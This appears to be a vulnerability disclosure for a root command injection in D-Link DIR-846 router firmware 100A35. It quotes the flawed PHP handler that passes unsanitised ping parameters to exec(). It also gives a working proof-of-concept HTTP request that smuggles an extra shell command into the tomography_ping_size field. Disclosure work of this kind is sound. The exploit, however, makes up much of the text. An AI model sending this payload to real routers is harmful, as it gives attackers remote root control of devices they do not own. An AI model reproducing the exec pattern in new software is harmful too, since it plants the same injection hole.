# DIR-846 100A35

D-Link DIR-846 devices with firmware 100A35 allow remote attackers to execute arbitrary OS commands as root by sending a request for SetNetworkTomographySettings with shell metacharacters to /www/HNAP1/control/SetNetworkTomographySettings.php. 

 Vulnerability code 

```
    public function actionIndex()
    {
        $result['SetNetworkTomographySettingsResult'] = "FAIL";
        $option = $this->act_val;

        $ping_number_range = array("options" => array("min_range" => 1, "max_range" => 50));
        $ping_size_range = array("options" => array("min_range" => 4, "max_range" => 1472));

        if (!filter_var($option['tomography_ping_number'], FILTER_VALIDATE_INT, $ping_number_range)) {  //校验ping次数范围
            $result["message"] = "ping的次数不合法";
        } elseif (!filter_var($option['tomography_ping_size'], FILTER_VALIDATE_INT, $ping_size_range)) {  //校验ping包大小范围
            $result["message"] = "ping包大小不合法";
        } elseif (!(filter_var($option['tomography_ping_address'], FILTER_VALIDATE_IP)  //校验是否为合法IP或域名
            || check_domain($option['tomography_ping_address']))) {
            $result["message"] = "不是合法的IP或域名";
        } else {
            exec("ping -c " . $option['tomography_ping_number'] . " -s " . $option['tomography_ping_size'] . " '" . $option['tomography_ping_address'] . "' > /tmp/ping.result");
            file_put_contents("/etc/.SetNetworkTomography", json_encode($option));
            $result['SetNetworkTomographySettingsResult'] = "OK";
        }
        $this->api_response(__CLASS__, $result);
    }
```

 We can execute OS commands by constructing tomography_ping_number, tomography_ping_size or tomography_ping_address variables. 

POC

```
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"
HNAP_AUTH: 2FB5B79A97FFF1786E87095E1782F732 1573608228175
Referer: http://192.168.0.1/Diagnosis.html
Content-Length: 227
Cookie: PHPSESSID=7017cd87a498be58666d07002a6311a8; uid=EZYpFZtE; PrivateKey=287CC82F6F640A299531BB86B455A511
Connection: close

{"SetNetworkTomographySettings":{"tomography_ping_address":"192.168.0.2","tomography_ping_number":"2","tomography_ping_size":"4 127.0.0.1&&ifconfig>/www/b.txt&&ping -c 1 ","tomography_ping_timeout":"","tomography_ping_ttl":""}}
```

